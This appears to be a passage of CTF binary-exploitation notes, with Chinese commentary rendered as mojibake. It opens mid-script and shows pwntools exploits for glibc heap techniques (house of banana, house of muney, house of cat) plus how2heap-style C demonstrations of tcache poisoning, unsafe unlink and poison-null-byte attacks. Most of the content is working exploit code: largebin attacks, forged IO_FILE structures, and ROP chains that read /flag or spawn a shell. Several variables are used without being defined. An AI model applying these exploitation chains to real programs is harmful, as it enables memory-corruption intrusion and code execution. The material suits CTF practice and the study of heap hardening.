# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("week-4.hgame.lwsec.cn","31435")
p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)

# ----------------------leak addr--------------------------
add(0,0x520)# big
add(1,0x508)
add(2,0x508)# small IO_FILE

dele(0)
add(3,0x900)
show(0)
libc_base = l64()-0x1f70f0
main_arena = libc_base + 0x1f70f0 # largebin_mainarena
rtld_global = libc_base+0x23d020 # p &_rtld_global
setcontext = libc_base + libc.sym['setcontext'] + 61
ret = libc_base + libc.sym['setcontext'] + 0x14E
setcontext = libc_base + libc.sym['setcontext'] + 61
ret = libc_base + libc.sym['setcontext'] + 0x14E
pop_rdi = libc_base + 0x0000000000023ba5
bin_sh = libc_base + libc.search('/bin/sh\x00').next()
system =  libc_base + libc.sym['system']
pop_rdi = libc_base + 0x0000000000023ba5
pop_rsi = libc_base + 0x00000000000251fe
pop_rdx_r12 = libc_base + 0x000000000008bbb9
lg('ret')
lg('libc_base')
lg('rtld_global')
lg('ret')
# dbg()

edit(0,'a'*0x10)
show(0)
ru("a"*0x10)
heap_base = uu64()-0x290
lg('heap_base')
key = heap_base>>12
lg('key')
# -----------------------largebin attack-----------------------
edit(0,p64(main_arena)*2)
dele(2)
edit(0,p64(main_arena)*2 + p64(0) + p64(rtld_global-0x20))
add(3,0x900)


# -----------------------house of banana--------------------
fake_heap_addr = heap_base+0xcd0 # rtl_globalå¡«çš„åœ°å€ä¸€èˆ¬æŒ‡å‘å †çš„headå¤´
next_load = libc_base + 0x21c790

payload  = p64(0) + p64(next_load) 
payload += p64(0) + p64(fake_heap_addr)
payload += p64(setcontext) + p64(ret) # rdx_addr/call rdx

payload += p64(heap_base) + p64(ret)
payload += p64(pop_rsi) + p64(setcontext)
payload += p64(pop_rsi) + p64(0x10000)
payload += p64(pop_rdx_r12) + p64(7)*2
payload += p64(mprotect) + p64(heap_base+0x001b00)# shellcode_addr
payload = payload.ljust(0xc8,'\x00')

# payload += p64(bin_sh)
# payload += p64(ret)
# payload += p64(system)
# payload = payload.ljust(0xc8,'\x00')

payload += p64(fake_heap_addr + 0x28 + 0x18) # rdx+0xa0
payload += p64(pop_rdi) # rdx+0xa8
payload = payload.ljust(0x100,'\x00')
payload += p64(fake_heap_addr + 0x10 + 0x110)*0x3
payload += p64(0x10)
# payload = payload.ljust(0x334 - 0x10,'\x00')# 2.36
# payload += '\x10'
payload = payload.ljust(0x31C - 0x10,'\x00')# under 2.36
payload += '\x08'

edit(2,payload)# part2
edit(1,'a'*0x500+p64(fake_heap_addr + 0x20))# part1
edit(3,shellcode)
print(hex(len(shellcode)))
sla(">",5)# exit

ia()
```

##### 2.37ä»¥ä¸Š

```python
fake_heap_addr = heap_base + 0xbf0# rtl_globalå¡«çš„åœ°å€ä¸€èˆ¬æŒ‡å‘å †çš„headå¤´
next_load = libc_base + xxx

payload  = p64(0) + p64(next_load)
payload += p64(0) + p64(fake_heap_addr)
payload += p64(libc_base+0x0000000000157c3a) + p64(ret)
# 0x0000000000157c3a : mov rdx, rbp ; mov rdi, r13 ; call qword ptr [rax + 0x20]
# payload += p64(bin_sh) + p64(ret)
# payload += p64(system) + p64(setcontext)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0)

payload += p64(heap_base) + p64(ret)
payload += p64(pop_rsi) + p64(setcontext)
payload += p64(pop_rsi) + p64(0x10000)
payload += p64(pop_rdx) + p64(7)
payload += p64(mprotect) + p64(heap_base+0x001550)# shellcode_addr
payload += p64(0) + p64(0)

payload += p64(fake_heap_addr + 0x28 + 0x18)# 0xa0 rsp
payload += p64(pop_rdi)# 0xa8 rcx
payload = payload.ljust(0x100,'\x00')
payload += p64(fake_heap_addr + 0x10 + 0x110)*0x3
payload += p64(0x10)
payload = payload.ljust(0x334 - 0x10,'\x00')
payload += '\x10'

edit(2,payload)
edit(1,'a'*0x420 + p64(fake_heap_addr + 0x20))# call setcontext 
# dbg('b _dl_call_fini\nc\n')

sla('>>','5')
sla('name:','e4l4')
```

#### house of muney
elfæ–‡ä»¶åŸºç¡€
å¼€å¤´çš„åœ°æ–¹æ˜¯ELF Header ä¼šè®°å½•ç¨‹åºçš„å…¥å£
ç„¶åå°±æ˜¯PHT program header table, æ¯ä¸ªPHTæ¡ç›®å¯¹åº”ç€æ–‡ä»¶ä¸­çš„ä¸€æ®µæ•°æ®æ®µæˆ–ç¨‹åºæ®µï¼Œå®ƒæè¿°äº†æ®µçš„ä½ç½®ã€å¤§å°ã€æƒé™ç­‰ä¿¡æ¯ï¼ˆæ³¨æ„æ˜¯æ®µä¿¡æ¯ï¼Œæ®µæ˜¯ç¨‹åºåŠ è½½çš„åŸºæœ¬å•ä½ï¼‰
æ®µçš„ç±»å‹æœ‰ä»¥ä¸‹
PT_LOADï¼šå¯åŠ è½½çš„æ®µ
PT_DYNAMICï¼šåŠ¨æ€æ®µï¼ˆæ¯”å¦‚åŠ¨æ€é“¾æ¥ä¿¡æ¯ï¼‰
PT_INTERPï¼šè§£é‡Šå™¨è·¯å¾„
PT_NOTEï¼šæ³¨é‡Šä¿¡æ¯ç­‰

è€ŒèŠ‚æ˜¯ä¸€ä¸ªå­˜å‚¨å•ä½ï¼Œç®€å•æ¥è¯´å°±æ˜¯æ•°æ®å­˜å‚¨ï¼Œä¸»è¦æœ‰ç¬¦å·è¡¨ã€å­—ç¬¦ä¸²è¡¨ã€è°ƒè¯•ä¿¡æ¯ï¼Œä¸åŒçš„èŠ‚æœ‰ä¸åŒçš„åŠŸèƒ½

```
Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .note.gnu.build-i NOTE             0000000000000358  00000358
       0000000000000024  0000000000000000   A       0     0     4
  [ 2] .note.ABI-tag     NOTE             000000000000037c  0000037c
       0000000000000020  0000000000000000   A       0     0     4
  [ 3] .gnu.hash         GNU_HASH         00000000000003a0  000003a0
       0000000000000034  0000000000000000   A       4     0     8
  [ 4] .dynsym           DYNSYM           00000000000003d8  000003d8
       00000000000001b0  0000000000000018   A      27     1     8
  [ 5] .gnu.version      VERSYM           0000000000000676  00000676
       0000000000000024  0000000000000002   A       4     0     2
  [ 6] .gnu.version_r    VERNEED          00000000000006a0  000006a0
       0000000000000040  0000000000000000   A      27     1     8
  [ 7] .rela.dyn         RELA             00000000000006e0  000006e0
       0000000000000108  0000000000000018   A       4     0     8
  [ 8] .rela.plt         RELA             00000000000007e8  000007e8
       00000000000000d8  0000000000000018  AI       4    21     8
  [ 9] .init             PROGBITS         0000000000001000  00001000
       000000000000001b  0000000000000000  AX       0     0     4
  [10] .plt              PROGBITS         0000000000001020  00001020
       00000000000000a0  0000000000000010  AX       0     0     16
  [11] .plt.got          PROGBITS         00000000000010c0  000010c0
       0000000000000010  0000000000000010  AX       0     0     16
  [12] .plt.sec          PROGBITS         00000000000010d0  000010d0
       0000000000000090  0000000000000010  AX       0     0     16
  [13] .text             PROGBITS         0000000000001160  00001160
       0000000000000725  0000000000000000  AX       0     0     16
  [14] .fini             PROGBITS         0000000000001888  00001888
       000000000000000d  0000000000000000  AX       0     0     4
  [15] .rodata           PROGBITS         0000000000002000  00002000
       00000000000003c8  0000000000000000   A       0     0     8
  [16] .eh_frame_hdr     PROGBITS         00000000000023c8  000023c8
       000000000000007c  0000000000000000   A       0     0     4
  [17] .eh_frame         PROGBITS         0000000000002448  00002448
       00000000000001e8  0000000000000000   A       0     0     8
  [18] .init_array       INIT_ARRAY       0000000000003de8  00002de8
       0000000000000008  0000000000000008  WA       0     0     8
  [19] .fini_array       FINI_ARRAY       0000000000003df0  00002df0
       0000000000000008  0000000000000008  WA       0     0     8
  [20] .got              PROGBITS         0000000000003fd8  00002fd8
       0000000000000028  0000000000000008  WA       0     0     8
  [21] .got.plt          PROGBITS         0000000000004000  00003000
       0000000000000060  0000000000000008  WA       0     0     8
  [22] .data             PROGBITS         0000000000004060  00003060
       0000000000000018  0000000000000000  WA       0     0     8
  [23] .bss              NOBITS           0000000000004080  00003078
       0000000000000840  0000000000000000  WA       0     0     32
  [24] .comment          PROGBITS         0000000000000000  00003078
       000000000000002b  0000000000000001  MS       0     0     1
  [25] .shstrtab         STRTAB           0000000000000000  000030a3
       0000000000000113  0000000000000000           0     0     1
  [26] .dynamic          DYNAMIC          0000000000005000  00004000
       00000000000001f0  0000000000000010  WA      27     0     8
  [27] .dynstr           STRTAB           00000000000051f0  000041f0
       000000000000012a  0000000000000000   A       0     0     8
  [28] .interp           PROGBITS         0000000000005320  00004320
       0000000000000051  0000000000000000   A       0     0     8
  [29] .note.gnu.propert NOTE             0000000000005378  00004378
       0000000000000020  0000000000000000   A       0     0     8
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)
```


å…¶ä¸­çš„é‡å®šä½èŠ‚æœ‰ .rela.dynå’Œ.rela.pltï¼Œæ¯ä¸ªæ¡ç›®åŒ…å«ä¸€ä¸ª r_offsetï¼ˆç›®æ ‡åœ°å€åç§»ï¼‰å’Œ r_infoï¼ˆç¬¦å·ç´¢å¼•å’Œé‡å®šä½ç±»å‹ï¼‰
ä¼šæ ¹æ®r_infoä¸­å­˜æ”¾çš„idxæ¥ç¡®å®špltè·³è¡¨çš„idx
Lazing bind åœ¨æœç´¢å‡½æ•°æ—¶ï¼Œå…ˆæ ¹æ®è·³è¡¨æ‰§è¡Œåˆ°dlå‡½æ•°ï¼Œå¤„ç†å®Œåå¾—åˆ°å‡½æ•°åï¼Œå†å».dynstr(ELF Strings Table)ä¸­æœç´¢å¯¹åº”çš„å‡½æ•°åï¼Œåœ¨.dynsym(ELF Symbol Table)ä¸­æŸ¥æ‰¾åå­—å¯¹åº”çš„çœŸå®åœ°å€å†™å…¥gotè¡¨ï¼Œæ­¤åä¸å†è®¿é—®.dynsymï¼Œä»gotè¡¨æ‰§è¡Œ
æ•´ä¸ªè¿‡ç¨‹è®¿é—®2æ¬¡.dynsym
.pltèŠ‚å’Œ.plt.got/.plt.secèŠ‚çš„åŒºåˆ«åœ¨äºæ˜¯å¦ç”¨lazy bind


![](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/2020071611211031.png)

åŸç†ï¼š

åœ¨libcä¸Šæ–¹ç”³è¯·å¤§å †ï¼Œä¿®æ”¹å…¶sizeä½ï¼Œå†freeå°±ä¼šå¯¼è‡´libcéƒ¨åˆ†è¢«freeï¼ˆåé¦ˆä¸ºlibcç©ºé—´å‡å°ï¼‰
å†ç”³è¯·å›æ¥å³å¯ï¼Œæ­¤æ—¶ä¼šè¢«å¡«å……ä¸º0éœ€è¦ä¼ªé€ ï¼ŒåŠ«æŒ.dynsym(ELF Symbol Table)ä¸­å¯¹åº”å‡½æ•°çš„çœŸå®åœ°å€å³å¯

```python
'''
    0x7fc20e17a000     0x7fc20e1b9000 rw-p    3f000      0 [anon_7fc20e17a]
    0x7fc20e1b9000     0x7fc20e1db000 r--p    22000      0 /home/ef4tless/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so
'''

add(0, 0x40000-0x2000)# 00007f8955828000     0000000000000000 000000000003f002
edit(0,-8, p64(0x41002 + 0x5000 + 0x4000))
dele(0)
add(0, 0x41000 * 2 + 0x4000)

'''
    0x7fc20e13d000     0x7fc20e1c4000 rw-p    87000      0 [anon_7fc20e13d]
    0x7fc20e1c4000     0x7fc20e1db000 r--p    17000   b000 /home/ef4tless/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so
'''

base_off =  0x7bff0
one_gadget = [0xe3afe, 0xe3b01, 0xe3b04][1]
gnu_hash_section = libc.get_section_by_name('.gnu.hash')
dynsym_section = libc.get_section_by_name('.dynsym')
dynstr_section = libc.get_section_by_name('.dynstr')
namehash = gnu_hash_section.gnu_hash('exit')
bloom_off = gnu_hash_section['sh_addr'] + 4 * gnu_hash_section._wordsize
bucket_off = bloom_off + gnu_hash_section.params['bloom_size'] * gnu_hash_section._xwordsize
bloom_elem_idx = int(namehash /gnu_hash_section.elffile.elfclass) % gnu_hash_section.params['bloom_size']
bloom_elem_off = bloom_off + bloom_elem_idx * gnu_hash_section._xwordsize
bloom_elem_val = gnu_hash_section.params['bloom'][bloom_elem_idx]
bucket_elem_idx = namehash % gnu_hash_section.params['nbuckets']
bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize
bucket_elem_val = gnu_hash_section.params['buckets'][bucket_elem_idx]
hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params['symoffset']) * gnu_hash_section._wordsize
sym_off = dynsym_section['sh_offset'] + bucket_elem_val * dynsym_section['sh_entsize']

sym_value = b''
sym_value += p32(next(libc.search(b'exit\x00')) - dynstr_section['sh_offset']) # st_name
sym_value += p8(0x12) # st_info
sym_value += p8(0) # st_other
sym_value += p16(1) # st_shndx
sym_value += p64(one_gadget) # st_value
sym_value += p64(8) # st_size

edit(0, base_off + bloom_elem_off, p64(bloom_elem_val))
edit(0, base_off + bucket_elem_off, p32(bucket_elem_val))
edit(0, base_off + hasharr_off, p32(namehash))
edit(0, base_off + sym_off, sym_value)
sla(b"option:", 5)
```


#### house of cat 
é€‚ç”¨èŒƒå›´ï¼š


åˆ©ç”¨åŸç†ï¼š


åˆ©ç”¨é“¾ï¼š

```c
__malloc_assert->__fxprintf->locked_vfxprintf->__vfprintf_interna->__vfprintf_internal
->_IO_wfile_seekoff->_IO_switch_to_wget_mode(_IO_WOVERFLOW)
```


````python
def login():
    sa("mew mew mew~~~~~~",'LOGIN | r00t QWB QWXFadmin')

def game():
    sa("mew mew mew~~~~~~",'CAT | r00t QWB QWXF'+'\xff'+'$')

def add(idx,size,con='a'):
    game()
    sla("plz input your cat choice:",1)
    sla("plz input your cat idx:",idx)
    sla("plz input your cat size:",size)
    p.sendafter("plz input your content:",con)

def dele(idx):
    game()
    sla("plz input your cat choice:",2)
    sla("plz input your cat idx:",idx)

def show(idx):
    game()
    sla("plz input your cat choice:",3)
    sla("plz input your cat idx:",idx)

def edit(idx,con):
    game()
    sla("plz input your cat choice:",4)
    sla("plz input your cat idx:",idx)
    p.sendafter("plz input your content:",con)


login()
add(0,0x420)
add(1,0x418)
add(2,0x418)

dele(0)
add(3,0x430)
show(0)
libc_base = l64()-0x21A0D0
lg('libc_base')
main_arena = libc_base+0x21A0D0
p.recv(10)
heap_base=u64(p.recv(6).ljust(8,'\x00'))-0x290
lg('heap_base')
#---------------------------------------------------------
setcontext = libc_base + libc.sym['setcontext'] + 61 
# Close = libc_base + libc.sym['close']
# Open = libc_base + libc.sym["open"]
Read = libc_base + libc.sym["read"]
Write = libc_base + libc.sym['write']
stderr = libc_base + libc.sym['stderr'] # *
IO_wfile_jumps = libc_base + 0x2160c0 # *
lg('IO_wfile_jumps')
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_rbx = libc_base + 0x0000000000090529 
pop_rax = libc_base + 0x0000000000045eb0
syscall = libc_base + 0x0000000000091396
ret= libc_base + 0x0000000000029cd6


orw_addr = heap_base+0x17b0
fake_io_addr = heap_base+0xae0  # ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€
flag = fake_io_addr+0x160

next_chain = 0
fake_IO_FILE  = p64(0xfbad1800) + p64(0) # _flag = '/bin/sh'/rdi
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(1)+p64(2)
fake_IO_FILE += p64(fake_io_addr+0xb0) # _IO_backup_base = setcontext_rdx/rdx
fake_IO_FILE += p64(setcontext) # _IO_save_end = call addr(call setcontext)
fake_IO_FILE =  fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0) # _chain
fake_IO_FILE =  fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heap_base) # _lock = a writable address
fake_IO_FILE =  fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data,rax1_addr
fake_IO_FILE =  fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) # _mode = 1
fake_IO_FILE =  fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps+0x10)  # vtable
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

fake_IO_FILE =  fake_IO_FILE.ljust(0x150,'\x00')
fake_IO_FILE += p64(orw_addr)+p64(ret)# fake_io_addr+0xb0+0xa0/0xa8
fake_IO_FILE += '/flag'.ljust(0x10, '\x00')

dele(2)# å› ä¸ºé¢˜ç›®åªèƒ½edit 0x30/æ‰€ä»¥è¦é‡æ–°ç”³è¯·
add(5,0x418,fake_IO_FILE[0x10:])

dele(2)
edit(0,p64(main_arena)*2+p64(0)+p64(stderr-0x20))
add(4,0x450)
#----------------------------------------------
# orw =  p64(pop_rdi)+p64(0)+p64(Close)# é™åˆ¶äº†readçš„fdä¸º0
# orw += p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(Open)
orw += p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(syscall)
orw += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(fake_io_addr+0x200)+p64(pop_rdx_rbx)+p64(0x30)+p64(0)+p64(Read)
orw += p64(pop_rdi)+p64(1)+p64(Write)
add(6,0x450,orw)

# Largebinattackæ”¹topchunkä½ä¸ºå°å€¼
add(7,0x440)
add(8,0x430)
add(9,0x430)
dele(7)
add(10,0x450)
dele(9)
edit(7,p64(libc_base+0x21a0e0)*2+p64(0)+p64(heap_base+0x2d30+3-0x20))
game()
sla("plz input your cat choice:",1)
sla("plz input your cat idx:",15)
sla("plz input your cat size:",0x468)# Largebinattack å’Œ __malloc_assert

p.interactive()
````

### how2heap

å˜é‡æœ¬èº«ç†è§£ä¸ºä¸€ä¸ªå¥—å£³
æ¯”å¦‚mallocè¿”å›ä¸€ä¸ªåœ°å€ï¼Œå°±æ˜¯æ”¾è¿›å£³é‡Œè¾¹ï¼Œå£³å’Œå£³é‡Œçš„æ•°æ®éƒ½æ˜¯ä¸€ä½“çš„

æŒ‡é’ˆå˜é‡å’Œæ•°ç»„å˜é‡æœ‰æ‰€ä¸åŒï¼Œæ•°ç»„å˜é‡æœ¬èº«ä¼šè¢«èµ‹äºˆå…¶è‡ªå·±çš„é¦–åœ°å€ï¼Œä½¿å¾—å®ç°test[1]å°±æ˜¯å†…å®¹ä½
å³addr->test[0]ï¼ˆaddrï¼‰->nil

#### 2.39

##### unsafe_unlink
æ³¨æ„ä¸è¦ä½¿ç”¨fastbinå’Œtcachebin
è¿™é‡ŒæŠŠä¸Šå †å—ç§°ä¸º0ï¼Œä¸‹å †å—ç§°ä¸º1
å‘ä¸Šåˆå¹¶+ä¼ªé€ ä¸Šå †å— => æ„é€ bssæ®µä¸Šè‡ªå¾ªç¯æŒ‡é’ˆ => ä»»æ„åœ°å€å†™
å¯¹ä¸Šçš„è¿™ä¸ªå †çš„FDå’ŒBKåšç‰¹æ®Šå¤„ç†å°±èƒ½æŠŠä¸Šçš„è¿™ä¸ªå †çš„FDçš„å€¼å†™å…¥è‡ªå·±+0x18çš„ä½ç½®é‡Œè¾¹ï¼Œå½¢æˆè‡ªæŒ‡é’ˆï¼Œå®ç°ä»»æ„åœ°å€è¯»å†™

```c
int malloc_size = 0x420;
int header_size = 2;

chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1

//åœ¨0å·å †å—ä¸‹ä¸€è¡Œä¼ªé€ chunk
chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);//FD
chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);//BK

//ä¿®æ”¹1å †å—çš„preive_sizeä»¥åŠsizeä½ï¼Œä½“ç°0å †å—çš„free
uint64_t *chunk1_hdr = chunk1_ptr - header_size;
chunk1_hdr[0] = malloc_size;
chunk1_hdr[1] &= ~1;
//å‘ä¸Šåˆå¹¶
free(chunk1_ptr);
//æ­¤æ—¶&chunk0_ptr-> &chunk0_ptr-0x18(ä¼ªé€ çš„fd)
//æ„æˆè‡ªå¾ªç¯æŒ‡é’ˆ

//ä¿®æ”¹chunk0_ptrï¼Œç»™å£³é‡Œæ”¾å…¥ç›®æ ‡åœ°å€ï¼Œ
char victim_string[8];
strcpy(victim_string,"Hello!~");
chunk0_ptr[3] = (uint64_t) victim_string;

//ä¿®æ”¹ç›®æ ‡åœ°å€é‡Œçš„å€¼
chunk0_ptr[0] = 0x4141414142424242LL;


assert(*(long *)victim_string == 0x4141414142424242L);
victim_stringåœ°å€è¢«å†™å…¥BBBBAAAA

```


#####  tcache_stashing_unlink_attack

è—åŒ¿unlinkï¼Œå¯ä»¥æŠŠä»»æ„åœ°å€æ”¾è¿›tcacheé“¾è¡¨é‡Œ
è¦è‡³å°‘ä¸€æ¬¡callocè¿›è¡Œè§¦å‘ï¼Œè¦æœ‰è¦†å†™chunkåˆ°bkçš„èƒ½åŠ›(éœ€è¦ä¿®æ”¹smallbinchunkçš„bk)
è¦ä¸€ä¸ªå¯ä¾›å¸ƒç½®çš„å¯å†™åœ°å€

```C
unsigned long stack_var[0x10] = {0};
unsigned long *chunk_lis[0x10] = {0};
unsigned long *target;

// stack_var[0]æ˜¯0  stack_var[1]æ˜¯size
// stack_var[2]æ˜¯fd stack_var[3]æ˜¯bk
stack_var[3] = (unsigned long)(&stack_var[2]);
//è¿™æ ·ä¸€æ¥ bk+0x10 å°±æ˜¯stack_var[4]ä¼šè¢«æ”¾ç½®ä¸€ä¸ªlibcåœ°å€ï¼Œæ¢å¥è¯è¯´stack_var[2]éœ€è¦æ˜¯ä¸€ä¸ªå¯å†™åœ°å€ï¼ï¼ï¼


//now we malloc 9 chunks 
for(int i = 0;i < 9;i++){
	chunk_lis[i] = (unsigned long*)malloc(0x90);
}

// ä¸ºäº†é˜²æ­¢0å’Œ2unsortbinçš„åˆå¹¶æ²¡æœ‰ç”¨è¿ç»­çš„å †å—ï¼Œ1å’Œ3-9 å…±7
for(int i = 3;i < 9;i++){
	free(chunk_lis[i]);
}
free(chunk_lis[1]);

//2ä¸ªé“¾æ¥çš„unsortbinchunk 2->0
free(chunk_lis[0]);
free(chunk_lis[2]);

//æ‰”åˆ°smallbin
malloc(0xa0);// size > 0x90

//ç”³è¯·2ä¸ªtcache,ä¸ºsmallbinç•™ç©ºé—´
malloc(0x90);
malloc(0x90);

//ä¿®æ”¹2çš„bkæŒ‡é’ˆæŒ‡å‘fake_headerï¼ˆå³è¦æœ‰ä¿®æ”¹bkæŒ‡é’ˆçš„èƒ½åŠ›ï¼‰
chunk_lis[2][1] = (unsigned long)stack_var;

//è§¦å‘åï¼Œfake_chunkè¢«æ”¾ç½®åˆ°tcacheå¤´ï¼ŒåŒæ—¶å…¶åŸæœ¬bkçš„å€¼+0x10çš„åœ°æ–¹å†™å…¥ä¸€ä¸ªlibcåœ°å€
calloc(1,0x90);
target = malloc(0x90); 


assert(target == &stack_var[2]);
```


##### tcache_poisoning

```c
size_t stack_var[0x10];
size_t *target = NULL;

//ç”³è¯·ä¸€ä¸ªå¯¹é½çš„åœ°å€ä½œä¸ºç›®æ ‡åœ°å€ï¼Œtcacheè¿”å›çš„å—å¿…é¡»æ­£ç¡®å¯¹é½
for(int i=0; i<0x10; i++) {
	if(((long)&stack_var[i] & 0xf) == 0) {
		target = &stack_var[i];
		break;
	}
}

//ä¸ªæ•°è¦æ»¡è¶³tcacheè§„èŒƒ
intptr_t *a = malloc(128);
intptr_t *b = malloc(128);
free(a);
free(b);
// b->a

b[0] = (intptr_t)((long)target ^ (long)b >> 12);
malloc(128)
intptr_t *c = malloc(128);
```

##### tcache_house_of_spirit


malloc.c in function \_int_free that tcache_put è¢«ä½¿ç”¨è€Œæ²¡æœ‰æ£€æµ‹nextchunksizeå’Œprev_inuseä½ï¼Œå¯¼è‡´åªç”¨ä¼ªé€ ä¸€ä¸ªsizeä½å°±èƒ½è¢«å½“ä½œä¸€ä¸ªå¯freeçš„å †å—

```c
//è®¾ç½®å¥½å†…å­˜
malloc(1);

//ä¼ªé€ fake_chunkï¼Œäº‹å®ä¸Šåªä¼ªé€ äº†ä¸€ä¸ªsizeä½
unsigned long long *a; //pointer that will be overwritten
unsigned long long fake_chunks[10]; //fake chunk region
fake_chunks[1] = 0x40; // this is the size
a = &fake_chunks[2];

free(a);
void *b = malloc(0x30);

assert((long)b == (long)&fake_chunks[2]);

```

##### sysmalloc_int_free

ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨mallocæ¥å®ç°free

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20241225112752.png)

##### safe_link_double_protect

æ„Ÿè§‰ä¸»è¦æ˜¯ä»‹ç»tcacheçš„æŒ‡é’ˆåŠ å¯†çš„ï¼Œç”¨å¼‚æˆ–æ¥è§£å†³


```c
void *a = malloc(0x38);
void *b = malloc(0x38);
void *c = malloc(0x18);
void *d = malloc(0x18);

// å †ä¸Šå­˜æ”¾äº†ç›®æ ‡åœ°å€
void *value = malloc(0x28);
*(long *)value = ((long)(goal) & ~(0xf));

free(a);
free(b);
free(c);
free(d);

// tcache struct åŠ«æŒ0x40binså¤´èŠ‚ç‚¹ä¸ºå­˜æ”¾ç›®æ ‡åœ°å€çš„å †å—
void *metadata = (void *)((long)(value) & ~(0xfff));
*(unsigned int*)(metadata+0xa0) = (long)(metadata)+((long)(value) & (0xfff));

void *_ = malloc(0x38);
// tcache struct åŠ«æŒ0x20binså¤´èŠ‚ç‚¹ä¸º0x40binså¤´èŠ‚ç‚¹ä½ç½®
*(unsigned int*)(metadata+0x90) = (long)(metadata)+0xa0;

// åœ¨0x20binsé‡Œ value -> goal
_ = malloc(0x18);
char *vuln = malloc(0x18);

strcpy(vuln, "XXXXXXXXXXX HIJACKED!");
assert(strcmp(goal, "Replace me!") != 0);
```

##### poison_null_byte

è¿™é‡Œç²˜è¿çš„fdå’Œbkéƒ½æ˜¯è‡ªç„¶æŒ‡å‘å¤´çš„

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/26177342-3385e98bb1814af0.png)

```c
//åˆ†é…æ‰paddingä½¿å¾— fake chunk's addresses's lowest 2nd byte is \x0
void *tmp = malloc(0x1);
void *heap_base = (void *)((long)tmp & (~0xfff));
size_t size = 0x10000 - ((long)tmp&0xffff) - 0x20;
void *padding= malloc(size);

//a æ¯”prevå°ä¸€ç‚¹ï¼Œbå¤§ä¸€ç‚¹
void *prev = malloc(0x500);
void *victim = malloc(0x4f0);
malloc(0x10);
void *a = malloc(0x4f0);
malloc(0x10);
void *b = malloc(0x510);
malloc(0x10);

//è¿›larbiné‡æ–°æ’åº
free(a);
free(b);
free(prev);
malloc(0x1000);

//ç²˜è¿fdnextå’Œbknextåç”³è¯·å‡ºæ¥ï¼Œè®¾ç½®victimçš„prevsize
void *prev2 = malloc(0x500);
((long *)prev)[1] = 0x501;
*(long *)(prev + 0x500) = 0x500;

//ä¸ºbè®¾ç½®FD
void *b2 = malloc(0x510);
((char*)b2)[0] = '\x10';
((char*)b2)[1] = '\x00';  // b->fd <- fake_chunk

//ä¸ºaè®¾ç½®BKï¼Œ a->bck points to victim å€Ÿè¿™ä¸ªåœ°å€è¿›è¡Œå¤„ç†
void *a2 = malloc(0x4f0);
free(a2);
free(victim);
void *a3 = malloc(0x4f0);
((char*)a3)[8] = '\x10';
((char*)a3)[9] = '\x00';

//æ”¹victimçš„sizeä½ï¼Œå‘ä¸Šåˆå¹¶
void *victim2 = malloc(0x4f0);
